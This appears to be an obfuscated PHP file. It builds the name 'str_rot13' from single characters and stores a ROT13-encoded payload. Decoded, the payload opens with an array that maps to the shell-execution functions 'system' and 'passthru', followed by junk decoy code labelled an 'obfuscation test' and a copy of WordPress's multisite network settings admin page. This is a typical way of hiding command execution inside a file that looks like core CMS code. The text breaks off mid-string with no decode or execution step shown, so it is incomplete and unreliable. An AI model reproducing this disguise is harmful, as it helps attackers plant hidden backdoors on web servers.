<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zhygvfvgr argjbex frggvatf nqzvavfgengvba cnary.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.0.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

/** JbeqCerff Genafyngvba Vafgnyyngvba NCV */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/genafyngvba-vafgnyy.cuc';

vs ( ! pheerag_hfre_pna( 'znantr_argjbex_bcgvbaf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
}

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Argjbex Frggvatf' );
$cnerag_svyr = 'frggvatf.cuc';

// Unaqyr argjbex nqzva rznvy punatr erdhrfgf.
vs ( ! rzcgl( $_TRG['argjbex_nqzva_unfu'] ) ) {
	$arj_nqzva_qrgnvyf = trg_fvgr_bcgvba( 'argjbex_nqzva_unfu' );
	$erqverpg          = 'frggvatf.cuc?hcqngrq=snyfr';
	vs ( vf_neenl( $arj_nqzva_qrgnvyf ) && unfu_rdhnyf( $arj_nqzva_qrgnvyf['unfu'], $_TRG['argjbex_nqzva_unfu'] ) && ! rzcgl( $arj_nqzva_qrgnvyf['arjrznvy'] ) ) {
		hcqngr_fvgr_bcgvba( 'nqzva_rznvy', $arj_nqzva_qrgnvyf['arjrznvy'] );
		qryrgr_fvgr_bcgvba( 'argjbex_nqzva_unfu' );
		qryrgr_fvgr_bcgvba( 'arj_nqzva_rznvy' );
		$erqverpg = 'frggvatf.cuc?hcqngrq=gehr';
	}
	jc_erqverpg( argjbex_nqzva_hey( $erqverpg ) );
	rkvg;
} ryfrvs ( ! rzcgl( $_TRG['qvfzvff'] ) && 'arj_argjbex_nqzva_rznvy' === $_TRG['qvfzvff'] ) {
	purpx_nqzva_ersrere( 'qvfzvff_arj_argjbex_nqzva_rznvy' );
	qryrgr_fvgr_bcgvba( 'argjbex_nqzva_unfu' );
	qryrgr_fvgr_bcgvba( 'arj_nqzva_rznvy' );
	jc_erqverpg( argjbex_nqzva_hey( 'frggvatf.cuc?hcqngrq=gehr' ) );
	rkvg;
}

nqq_npgvba( 'nqzva_urnq', 'argjbex_frggvatf_nqq_wf' );

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
			'<c>' . __( 'Guvf fperra frgf naq punatrf bcgvbaf sbe gur argjbex nf n jubyr. Gur svefg fvgr vf gur znva fvgr va gur argjbex naq argjbex bcgvbaf ner chyyrq sebz gung bevtvany fvgr&#8217;f bcgvbaf.' ) . '</c>' .
			'<c>' . __( 'Bcrengvbany frggvatf unf svryqf sbe gur argjbex&#8217;f anzr naq nqzva rznvy.' ) . '</c>' .
			'<c>' . __( 'Ertvfgengvba frggvatf pna qvfnoyr/ranoyr choyvp fvtahcf. Vs lbh yrg bguref fvta hc sbe n fvgr, vafgnyy fcnz cyhtvaf. Fcnprf, abg pbzznf, fubhyq frcnengr anzrf onaarq nf fvgrf sbe guvf argjbex.' ) . '</c>' .
			'<c>' . __( 'Arj fvgr frggvatf ner qrsnhygf nccyvrq jura n arj fvgr vf perngrq va gur argjbex. Gurfr vapyhqr jrypbzr rznvy sbe jura n arj fvgr be hfre nppbhag vf ertvfgrerq, naq jung&#8127;f chg va gur svefg cbfg, cntr, pbzzrag, pbzzrag nhgube, naq pbzzrag HEY.' ) . '</c>' .
			'<c>' . __( 'Hcybnq frggvatf pbageby gur fvmr bs gur hcybnqrq svyrf naq gur nzbhag bs ninvynoyr hcybnq fcnpr sbe rnpu fvgr. Lbh pna punatr gur qrsnhyg inyhr sbe fcrpvsvp fvgrf jura lbh rqvg n cnegvphyne fvgr. Nyybjrq svyr glcrf ner nyfb yvfgrq (fcnpr frcnengrq bayl).' ) . '</c>' .
			'<c>' . __( 'Lbh pna frg gur ynathntr, naq JbeqCerff jvyy nhgbzngvpnyyl qbjaybnq naq vafgnyy gur genafyngvba svyrf (ninvynoyr vs lbhe svyrflfgrz vf jevgnoyr).' ) . '</c>' .
			'<c>' . __( 'Zrah frggvat ranoyrf/qvfnoyrf gur cyhtva zrahf sebz nccrnevat sbe aba fhcre nqzvaf, fb gung bayl fhcre nqzvaf, abg fvgr nqzvaf, unir npprff gb npgvingr cyhtvaf.' ) . '</c>' .
			'<c>' . __( 'Fhcre nqzvaf pna ab ybatre or nqqrq ba gur Bcgvbaf fperra. Lbh zhfg abj tb gb gur yvfg bs rkvfgvat hfref ba Argjbex Nqzva > Hfref naq pyvpx ba Hfreanzr be gur Rqvg npgvba yvax orybj gung anzr. Guvf tbrf gb na Rqvg Hfre cntr jurer lbh pna purpx n obk gb tenag fhcre nqzva cevivyrtrf.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/zhygvfvgr/nqzva/frggvatf/\">Qbphzragngvba ba Argjbex Frggvatf</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

vs ( $_CBFG ) {
	/** Guvf npgvba vf qbphzragrq va jc-nqzva/argjbex/rqvg.cuc */
	qb_npgvba( 'jczhnqzvarqvg' );

	purpx_nqzva_ersrere( 'fvgrbcgvbaf' );

	$purpxrq_bcgvbaf = neenl(
		'zrah_vgrzf'                  => neenl(),
		'ertvfgengvbaabgvsvpngvba'    => 'ab',
		'hcybnq_fcnpr_purpx_qvfnoyrq' => 1,
		'nqq_arj_hfref'               => 0,
	);
	sbernpu ( $purpxrq_bcgvbaf nf $bcgvba_anzr => $bcgvba_hapurpxrq_inyhr ) {
		vs ( ! vffrg( $_CBFG[ $bcgvba_anzr ] ) ) {
			$_CBFG[ $bcgvba_anzr ] = $bcgvba_hapurpxrq_inyhr;
		}
	}

	$bcgvbaf = neenl(
		'ertvfgengvbaabgvsvpngvba',
		'ertvfgengvba',
		'nqq_arj_hfref',
		'zrah_vgrzf',
		'hcybnq_fcnpr_purpx_qvfnoyrq',
		'oybt_hcybnq_fcnpr',
		'hcybnq_svyrglcrf',
		'fvgr_anzr',
		'svefg_cbfg',
		'svefg_cntr',
		'svefg_pbzzrag',
		'svefg_pbzzrag_hey',
		'svefg_pbzzrag_nhgube',
		'jrypbzr_rznvy',
		'jrypbzr_hfre_rznvy',
		'svyrhcybnq_znkx',
		'vyyrtny_anzrf',
		'yvzvgrq_rznvy_qbznvaf',
		'onaarq_rznvy_qbznvaf',
		'JCYNAT',
		'arj_nqzva_rznvy',
		'svefg_pbzzrag_rznvy',
	);

	// Unaqyr genafyngvba vafgnyyngvba.
	vs ( ! rzcgl( $_CBFG['JCYNAT'] ) && pheerag_hfre_pna( 'vafgnyy_ynathntrf' ) && jc_pna_vafgnyy_ynathntr_cnpx() ) {
		$ynathntr = jc_qbjaybnq_ynathntr_cnpx( $_CBFG['JCYNAT'] );
		vs ( $ynathntr ) {
			$_CBFG['JCYNAT'] = $ynathntr;
		}
	}

	sbernpu ( $bcgvbaf nf $bcgvba_anzr ) {
		vs ( ! vffrg( $_CBFG[ $bcgvba_anzr ] ) ) {
			pbagvahr;
		}
		$inyhr = jc_hafynfu( $_CBFG[ $bcgvba_anzr ] );
		hcqngr_fvgr_bcgvba( $bcgvba_anzr, $inyhr );
	}

	/**
	 * Sverf nsgre gur argjbex bcgvbaf ner hcqngrq.
	 *
	 * @fvapr ZH (3.0.0)
	 */
	qb_npgvba( 'hcqngr_jczh_bcgvbaf' );

	jc_erqverpg( nqq_dhrel_net( 'hcqngrq', 'gehr', argjbex_nqzva_hey( 'frggvatf.cuc' ) ) );
	rkvg;
}

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

vs ( vffrg( $_TRG['hcqngrq'] ) ) {
	jc_nqzva_abgvpr(
		__( 'Frggvatf fnirq.' ),
		neenl(
			'glcr'        => 'fhpprff',
			'qvfzvffvoyr' => gehr,
			'vq'          => 'zrffntr',
		)
	);
}
?>

<qvi pynff=\"jenc\">
	<u1><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>
	<sbez zrgubq=\"cbfg\" npgvba=\"frggvatf.cuc\" abinyvqngr=\"abinyvqngr\">
		<?cuc jc_abapr_svryq( 'fvgrbcgvbaf' ); ?>
		<u2><?cuc _r( 'Bcrengvbany Frggvatf' ); ?></u2>
		<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"fvgr_anzr\"><?cuc _r( 'Argjbex Gvgyr' ); ?></ynory></gu>
				<gq>
					<vachg anzr=\"fvgr_anzr\" glcr=\"grkg\" vq=\"fvgr_anzr\" pynff=\"erthyne-grkg\" inyhr=\"<?cuc rpub rfp_ngge( trg_argjbex()->fvgr_anzr ); ?>\" />
				</gq>
			</ge>

			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"nqzva_rznvy\"><?cuc _r( 'Argjbex Nqzva Rznvy' ); ?></ynory></gu>
				<gq>
					<vachg anzr=\"arj_nqzva_rznvy\" glcr=\"rznvy\" vq=\"nqzva_rznvy\" nevn-qrfpevorqol=\"nqzva-rznvy-qrfp\" pynff=\"erthyne-grkg\" inyhr=\"<?cuc rpub rfp_ngge( trg_fvgr_bcgvba( 'nqzva_rznvy' ) ); ?>\" />
					<c pynff=\"qrfpevcgvba\" vq=\"nqzva-rznvy-qrfp\">
						<?cuc _r( 'Guvf nqqerff vf hfrq sbe nqzva checbfrf. Vs lbh punatr guvf, na rznvy jvyy or frag gb lbhe arj nqqerff gb pbasvez vg. <fgebat>Gur arj nqqerff jvyy abg orpbzr npgvir hagvy pbasvezrq.</fgebat>' ); ?>
					</c>
					<?cuc
					$arj_nqzva_rznvy = trg_fvgr_bcgvba( 'arj_nqzva_rznvy' );
					vs ( $arj_nqzva_rznvy && trg_fvgr_bcgvba( 'nqzva_rznvy' ) !== $arj_nqzva_rznvy ) :
						$abgvpr_zrffntr = fcevags(
							/* genafyngbef: %f: Arj argjbex nqzva rznvy. */
							__( 'Gurer vf n craqvat punatr bs gur argjbex nqzva rznvy gb %f.' ),
							'<pbqr>' . rfp_ugzy( $arj_nqzva_rznvy ) . '</pbqr>'
						);

						$abgvpr_zrffntr .= fcevags(
							' <n uers=\"%1$f\">%2$f</n>',
							rfp_hey( jc_abapr_hey( argjbex_nqzva_hey( 'frggvatf.cuc?qvfzvff=arj_argjbex_nqzva_rznvy' ), 'qvfzvff_arj_argjbex_nqzva_rznvy' ) ),
							__( 'Pnapry' )
						);

						jc_nqzva_abgvpr(
							$abgvpr_zrffntr,
							neenl(
								'glcr'               => 'jneavat',
								'qvfzvffvoyr'        => gehr,
								'nqqvgvbany_pynffrf' => neenl( 'vayvar' ),
							)
						);
					raqvs;
					?>
				</gq>
			</ge>
		</gnoyr>
		<u2><?cuc _r( 'Ertvfgengvba Frggvatf' ); ?></u2>
		<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
			<ge>
				<gu fpbcr=\"ebj\"><?cuc _r( 'Nyybj arj ertvfgengvbaf' ); ?></gu>
				<?cuc
				vs ( ! trg_fvgr_bcgvba( 'ertvfgengvba' ) ) {
					hcqngr_fvgr_bcgvba( 'ertvfgengvba', 'abar' );
				}
				$ert = trg_fvgr_bcgvba( 'ertvfgengvba' );
				?>
				<gq>
					<svryqfrg>
					<yrtraq pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Arj ertvfgengvbaf frggvatf' );
						?>
					</yrtraq>
					<ynory><vachg anzr=\"ertvfgengvba\" glcr=\"enqvb\" vq=\"ertvfgengvba1\" inyhr=\"abar\"<?cuc purpxrq( $ert, 'abar' ); ?> /> <?cuc _r( 'Ertvfgengvba vf qvfnoyrq' ); ?></ynory><oe />
					<ynory><vachg anzr=\"ertvfgengvba\" glcr=\"enqvb\" vq=\"ertvfgengvba2\" inyhr=\"hfre\"<?cuc purpxrq( $ert, 'hfre' ); ?> /> <?cuc _r( 'Hfre nppbhagf znl or ertvfgrerq' ); ?></ynory><oe />
					<ynory><vachg anzr=\"ertvfgengvba\" glcr=\"enqvb\" vq=\"ertvfgengvba3\" inyhr=\"oybt\"<?cuc purpxrq( $ert, 'oybt' ); ?> /> <?cuc _r( 'Ybttrq va hfref znl ertvfgre arj fvgrf' ); ?></ynory><oe />
					<ynory><vachg anzr=\"ertvfgengvba\" glcr=\"enqvb\" vq=\"ertvfgengvba4\" inyhr=\"nyy\"<?cuc purpxrq( $ert, 'nyy' ); ?> /> <?cuc _r( 'Obgu fvgrf naq hfre nppbhagf pna or ertvfgrerq' ); ?></ynory>
					<?cuc
					vs ( vf_fhoqbznva_vafgnyy() ) {
						rpub '<c pynff=\"qrfpevcgvba\">';
						cevags(
							/* genafyngbef: 1: ABOYBTERQVERPG, 2: jc-pbasvt.cuc */
							__( 'Vs ertvfgengvba vf qvfnoyrq, cyrnfr frg %1$f va %2$f gb n HEY lbh jvyy erqverpg ivfvgbef gb vs gurl ivfvg n aba-rkvfgrag fvgr.' ),
							'<pbqr>ABOYBTERQVERPG</pbqr>',
							'<pbqr>jc-pbasvt.cuc</pbqr>'
						);
						rpub '</c>';
					}
					?>
					</svryqfrg>
				</gq>
			</ge>

			<ge>
				<gu fpbcr=\"ebj\"><?cuc _r( 'Ertvfgengvba abgvsvpngvba' ); ?></gu>
				<?cuc
				vs ( ! trg_fvgr_bcgvba( 'ertvfgengvbaabgvsvpngvba' ) ) {
					hcqngr_fvgr_bcgvba( 'ertvfgengvbaabgvsvpngvba', 'lrf' );
				}
				?>
				<gq>
					<ynory><vachg anzr=\"ertvfgengvbaabgvsvpngvba\" glcr=\"purpxobk\" vq=\"ertvfgengvbaabgvsvpngvba\" inyhr=\"lrf\"<?cuc purpxrq( trg_fvgr_bcgvba( 'ertvfgengvbaabgvsvpngvba' ), 'lrf' ); ?> /> <?cuc _r( 'Fraq gur argjbex nqzva na rznvy abgvsvpngvba rirel gvzr fbzrbar ertvfgref n fvgr be hfre nppbhag' ); ?></ynory>
				</gq>
			</ge>

			<ge vq=\"nqqarjhfref\">
				<gu fpbcr=\"ebj\"><?cuc _r( 'Nqq Hfref' ); ?></gu>
				<gq>
					<ynory><vachg anzr=\"nqq_arj_hfref\" glcr=\"purpxobk\" vq=\"nqq_arj_hfref\" inyhr=\"1\"<?cuc purpxrq( trg_fvgr_bcgvba( 'nqq_arj_hfref' ) ); ?> /> <?cuc _r( 'Nyybj fvgr nqzvavfgengbef gb nqq arj hfref gb gurve fvgr ivn gur \"Hfref &enee; Nqq Hfre\" cntr' ); ?></ynory>
				</gq>
			</ge>

			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"vyyrtny_anzrf\"><?cuc _r( 'Onaarq Anzrf' ); ?></ynory></gu>
				<gq>
					<?cuc
					$vyyrtny_anzrf = trg_fvgr_bcgvba( 'vyyrtny_anzrf' );

					vs ( rzcgl( $vyyrtny_anzrf ) ) {
						$vyyrtny_anzrf = '';
					} ryfrvs ( vf_neenl( $vyyrtny_anzrf ) ) {
						$vyyrtny_anzrf = vzcybqr( ' ', $vyyrtny_anzrf );
					}
					?>
					<vachg anzr=\"vyyrtny_anzrf\" glcr=\"grkg\" vq=\"vyyrtny_anzrf\" nevn-qrfpevorqol=\"vyyrtny-anzrf-qrfp\" pynff=\"ynetr-grkg\" inyhr=\"<?cuc rpub rfp_ngge( $vyyrtny_anzrf ); ?>\" fvmr=\"45\" />
					<c pynff=\"qrfpevcgvba\" vq=\"vyyrtny-anzrf-qrfp\">
						<?cuc _r( 'Hfref ner abg nyybjrq gb ertvfgre gurfr fvgrf. Frcnengr anzrf ol fcnprf.' ); ?>
					</c>
				</gq>
			</ge>

			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"yvzvgrq_rznvy_qbznvaf\"><?cuc _r( 'Yvzvgrq Rznvy Ertvfgengvbaf' ); ?></ynory></gu>
				<gq>
					<?cuc
					$yvzvgrq_rznvy_qbznvaf = trg_fvgr_bcgvba( 'yvzvgrq_rznvy_qbznvaf' );

					vs ( rzcgl( $yvzvgrq_rznvy_qbznvaf ) ) {
						$yvzvgrq_rznvy_qbznvaf = '';
					} ryfr {
						// Pbaireg sebz na vachg svryq. Onpx-pbzcng sbe JCZH < 1.0.
						$yvzvgrq_rznvy_qbznvaf = fge_ercynpr( ' ', \"\a\", $yvzvgrq_rznvy_qbznvaf );

						vs ( vf_neenl( $yvzvgrq_rznvy_qbznvaf ) ) {
							$yvzvgrq_rznvy_qbznvaf = vzcybqr( \"\a\", $yvzvgrq_rznvy_qbznvaf );
						}
					}
					?>
					<grkgnern anzr=\"yvzvgrq_rznvy_qbznvaf\" vq=\"yvzvgrq_rznvy_qbznvaf\" nevn-qrfpevorqol=\"yvzvgrq-rznvy-qbznvaf-qrfp\" pbyf=\"45\" ebjf=\"5\">
<?cuc rpub rfp_grkgnern( $yvzvgrq_rznvy_qbznvaf ); ?></grkgnern>
					<c pynff=\"qrfpevcgvba\" vq=\"yvzvgrq-rznvy-qbznvaf-qrfp\">
						<?cuc _r( 'Vs lbh jnag gb yvzvg fvgr ertvfgengvbaf gb pregnva qbznvaf. Bar qbznva cre yvar.' ); ?>
					</c>
				</gq>
			</ge>

			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"onaarq_rznvy_qbznvaf\"><?cuc _r( 'Onaarq Rznvy Qbznvaf' ); ?></ynory></gu>
				<gq>
					<?cuc
					$onaarq_rznvy_qbznvaf = trg_fvgr_bcgvba( 'onaarq_rznvy_qbznvaf' );

					vs ( rzcgl( $onaarq_rznvy_qbznvaf ) ) {
						$onaarq_rznvy_qbznvaf = '';
					} ryfrvs ( vf_neenl( $onaarq_rznvy_qbznvaf ) ) {
						$onaarq_rznvy_qbznvaf = vzcybqr( \"\a\", $onaarq_rznvy_qbznvaf );
					}
					?>
					<grkgnern anzr=\"onaarq_rznvy_qbznvaf\" vq=\"onaarq_rznvy_qbznvaf\" nevn-qrfpevorqol=\"onaarq-rznvy-qbznvaf-qrfp\" pbyf=\"45\" ebjf=\"5\">
<?cuc rpub rfp_grkgnern( $onaarq_rznvy_qbznvaf ); ?></grkgnern>
					<c pynff=\"qrfpevcgvba\" vq=\"onaarq-rznvy-qbznvaf-qrfp\">
						<?cuc _r( 'Vs lbh jnag gb ona qbznvaf sebz fvgr ertvfgengvbaf. Bar qbznva cre yvar.' ); ?>
					</c>
				</gq>
			</ge>

		</gnoyr>
		<u2><?cuc _r( 'Arj Fvgr Frggvatf' ); ?></u2>
		<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">

			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"jrypbzr_rznvy\"><?cuc _r( 'Jrypbzr Rznvy' ); ?></ynory></gu>
				<gq>
					<grkgnern anzr=\"jrypbzr_rznvy\" vq=\"jrypbzr_rznvy\" nevn-qrfpevorqol=\"jrypbzr-rznvy-qrfp\" ebjf=\"5\" pbyf=\"45\" pynff=\"ynetr-grkg\">
<?cuc rpub rfp_grkgnern( trg_fvgr_bcgvba( 'jrypbzr_rznvy' ) ); ?></grkgnern>
					<c pynff=\"qrfpevcgvba\" vq=\"jrypbzr-rznvy-qrfp\">
						<?cuc _r( 'Gur jrypbzr rznvy frag gb arj fvgr bjaref.' ); ?>
					</c>
				</gq>
			</ge>
			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"jrypbzr_hfre_rznvy\"><?cuc _r( 'Jrypbzr Hfre Rznvy' ); ?></ynory></gu>
				<gq>
					<grkgnern anzr=\"jrypbzr_hfre_rznvy\" vq=\"jrypbzr_hfre_rznvy\" nevn-qrfpevorqol=\"jrypbzr-hfre-rznvy-qrfp\" ebjf=\"5\" pbyf=\"45\" pynff=\"ynetr-grkg\">
<?cuc rpub rfp_grkgnern( trg_fvgr_bcgvba( 'jrypbzr_hfre_rznvy' ) ); ?></grkgnern>
					<c pynff=\"qrfpevcgvba\" vq=\"jrypbzr-hfre-rznvy-qrfp\">
						<?cuc _r( 'Gur jrypbzr rznvy frag gb arj hfref.' ); ?>
					</c>
				</gq>
			</ge>
			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"svefg_cbfg\"><?cuc _r( 'Svefg Cbfg' ); ?></ynory></gu>
				<gq>
					<grkgnern anzr=\"svefg_cbfg\" vq=\"svefg_cbfg\" nevn-qrfpevorqol=\"svefg-cbfg-qrfp\" ebjf=\"5\" pbyf=\"45\" pynff=\"ynetr-grkg\">
<?cuc rpub rfp_grkgnern( trg_fvgr_bcgvba( 'svefg_cbfg' ) ); ?></grkgnern>
					<c pynff=\"qrfpevcgvba\" vq=\"svefg-cbfg-qrfp\">
						<?cuc _r( 'Gur svefg cbfg ba n arj fvgr.' ); ?>
					</c>
				</gq>
			</ge>
			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"svefg_cntr\"><?cuc _r( 'Svefg Cntr' ); ?></ynory></gu>
				<gq>
					<grkgnern anzr=\"svefg_cntr\" vq=\"svefg_cntr\" nevn-qrfpevorqol=\"svefg-cntr-qrfp\" ebjf=\"5\" pbyf=\"45\" pynff=\"ynetr-grkg\">
<?cuc rpub rfp_grkgnern( trg_fvgr_bcgvba( 'svefg_cntr' ) ); ?></grkgnern>
					<c pynff=\"qrfpevcgvba\" vq=\"svefg-cntr-qrfp\">
						<?cuc _r( 'Gur svefg cntr ba n arj fvgr.' ); ?>
					</c>
				</gq>
			</ge>
			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"svefg_pbzzrag\"><?cuc _r( 'Svefg Pbzzrag' ); ?></ynory></gu>
				<gq>
					<grkgnern anzr=\"svefg_pbzzrag\" vq=\"svefg_pbzzrag\" nevn-qrfpevorqol=\"svefg-pbzzrag-qrfp\" ebjf=\"5\" pbyf=\"45\" pynff=\"ynetr-grkg\">
<?cuc rpub rfp_grkgnern( trg_fvgr_bcgvba( 'svefg_pbzzrag' ) ); ?></grkgnern>
					<c pynff=\"qrfpevcgvba\" vq=\"svefg-pbzzrag-qrfp\">
						<?cuc _r( 'Gur svefg pbzzrag ba n arj fvgr.' ); ?>
					</c>
				</gq>
			</ge>
			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"svefg_pbzzrag_nhgube\"><?cuc _r( 'Svefg Pbzzrag Nhgube' ); ?></ynory></gu>
				<gq>
					<vachg glcr=\"grkg\" fvmr=\"40\" anzr=\"svefg_pbzzrag_nhgube\" vq=\"svefg_pbzzrag_nhgube\" nevn-qrfpevorqol=\"svefg-pbzzrag-nhgube-qrfp\" inyhr=\"<?cuc rpub rfp_ngge( trg_fvgr_bcgvba( 'svefg_pbzzrag_nhgube' ) ); ?>\" />
					<c pynff=\"qrfpevcgvba\" vq=\"svefg-pbzzrag-nhgube-qrfp\">
						<?cuc _r( 'Gur nhgube bs gur svefg pbzzrag ba n arj fvgr.' ); ?>
					</c>
				</gq>
			</ge>
			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"svefg_pbzzrag_rznvy\"><?cuc _r( 'Svefg Pbzzrag Rznvy' ); ?></ynory></gu>
				<gq>
					<vachg glcr=\"grkg\" fvmr=\"40\" anzr=\"svefg_pbzzrag_rznvy\" vq=\"svefg_pbzzrag_rznvy\" nevn-qrfpevorqol=\"svefg-pbzzrag-rznvy-qrfp\" inyhr=\"<?cuc rpub rfp_ngge( trg_fvgr_bcgvba( 'svefg_pbzzrag_rznvy' ) ); ?>\" />
					<c pynff=\"qrfpevcgvba\" vq=\"svefg-pbzzrag-rznvy-qrfp\">
						<?cuc _r( 'Gur rznvy nqqerff bs gur svefg pbzzrag nhgube ba n arj fvgr.' ); ?>
					</c>
				</gq>
			</ge>
			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"svefg_pbzzrag_hey\"><?cuc _r( 'Svefg Pbzzrag HEY' ); ?></ynory></gu>
				<gq>
					<vachg glcr=\"grkg\" fvmr=\"40\" anzr=\"svefg_pbzzrag_hey\" vq=\"svefg_pbzzrag_hey\" nevn-qrfpevorqol=\"svefg-pbzzrag-hey-qrfp\" inyhr=\"<?cuc rpub rfp_ngge( trg_fvgr_bcgvba( 'svefg_pbzzrag_hey' ) ); ?>\" />
					<c pynff=\"qrfpevcgvba\" vq=\"svefg-pbzzrag-hey-qrfp\">
						<?cuc _r( 'Gur HEY sbe gur svefg pbzzrag ba n arj fvgr.' ); ?>
					</c>
				</gq>
			</ge>
		</gnoyr>
		<u2><?cuc _r( 'Hcybnq Frggvatf' ); ?></u2>
		<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
			<ge>
				<gu fpbcr=\"ebj\"><?cuc _r( 'Fvgr hcybnq fcnpr' ); ?></gu>
				<gq>
					<ynory><vachg glcr=\"purpxobk\" vq=\"hcybnq_fcnpr_purpx_qvfnoyrq\" anzr=\"hcybnq_fcnpr_purpx_qvfnoyrq\" inyhr=\"0\"<?cuc purpxrq( (obby) trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' ), snyfr ); ?> />
						<?cuc
						cevags(
							/* genafyngbef: %f: Ahzore bs zrtnolgrf gb yvzvg hcybnqf gb. */
							__( 'Yvzvg gbgny fvmr bs svyrf hcybnqrq gb %f ZO' ),
							'</ynory><ynory><vachg anzr=\"oybt_hcybnq_fcnpr\" glcr=\"ahzore\" zva=\"0\" fglyr=\"jvqgu: 100ck\" vq=\"oybt_hcybnq_fcnpr\" nevn-qrfpevorqol=\"oybt-hcybnq-fcnpr-qrfp\" inyhr=\"' . rfp_ngge( trg_fvgr_bcgvba( 'oybt_hcybnq_fcnpr', 100 ) ) . '\" />'
						);
						?>
					</ynory><oe />
					<c pynff=\"fperra-ernqre-grkg\" vq=\"oybt-hcybnq-fcnpr-qrfp\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Fvmr va zrtnolgrf' );
						?>
					</c>
				</gq>
			</ge>

			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"hcybnq_svyrglcrf\"><?cuc _r( 'Hcybnq svyr glcrf' ); ?></ynory></gu>
				<gq>
					<vachg anzr=\"hcybnq_svyrglcrf\" glcr=\"grkg\" vq=\"hcybnq_svyrglcrf\" nevn-qrfpevorqol=\"hcybnq-svyrglcrf-qrfp\" pynff=\"ynetr-grkg\" inyhr=\"<?cuc rpub rfp_ngge( trg_fvgr_bcgvba( 'hcybnq_svyrglcrf', 'wct wcrt cat tvs' ) ); ?>\" fvmr=\"45\" />
					<c pynff=\"qrfpevcgvba\" vq=\"hcybnq-svyrglcrf-qrfp\">
						<?cuc _r( 'Nyybjrq svyr glcrf. Frcnengr glcrf ol fcnprf.' ); ?>
					</c>
				</gq>
			</ge>

			<ge>
				<gu fpbcr=\"ebj\"><ynory sbe=\"svyrhcybnq_znkx\"><?cuc _r( 'Znk hcybnq svyr fvmr' ); ?></ynory></gu>
				<gq>
					<?cuc
						cevags(
							/* genafyngbef: %f: Svyr fvmr va xvybolgrf. */
							__( '%f XO' ),
							'<vachg anzr=\"svyrhcybnq_znkx\" glcr=\"ahzore\" zva=\"0\" fglyr=\"jvqgu: 100ck\" vq=\"svyrhcybnq_znkx\" nevn-qrfpevorqol=\"svyrhcybnq-znkx-qrfp\" inyhr=\"' . rfp_ngge( trg_fvgr_bcgvba( 'svyrhcybnq_znkx', 300 ) ) . '\" />'
						);
						?>
					<c pynff=\"fperra-ernqre-grkg\" vq=\"svyrhcybnq-znkx-qrfp\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						_r( 'Fvmr va xvybolgrf' );
						?>
					</c>
				</gq>
			</ge>
		</gnoyr>

		<?cuc
		$ynathntrf    = trg_ninvynoyr_ynathntrf();
		$genafyngvbaf = jc_trg_ninvynoyr_genafyngvbaf();
		vs ( ! rzcgl( $ynathntrf ) || ! rzcgl( $genafyngvbaf ) ) {
			?>
			<u2><?cuc _r( 'Ynathntr Frggvatf' ); ?></u2>
			<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
				<ge>
					<gu><ynory sbe=\"JCYNAT\"><?cuc _r( 'Qrsnhyg Ynathntr' ); ?><fcna pynff=\"qnfuvpbaf qnfuvpbaf-genafyngvba\" nevn-uvqqra=\"gehr\"></fcna></ynory></gu>
					<gq>
						<?cuc
						$ynat = trg_fvgr_bcgvba( 'JCYNAT' );
						vs ( ! va_neenl( $ynat, $ynathntrf, gehr ) ) {
							$ynat = '';
						}

						jc_qebcqbja_ynathntrf(
							neenl(
								'anzr'         => 'JCYNAT',
								'vq'           => 'JCYNAT',
								'fryrpgrq'     => $ynat,
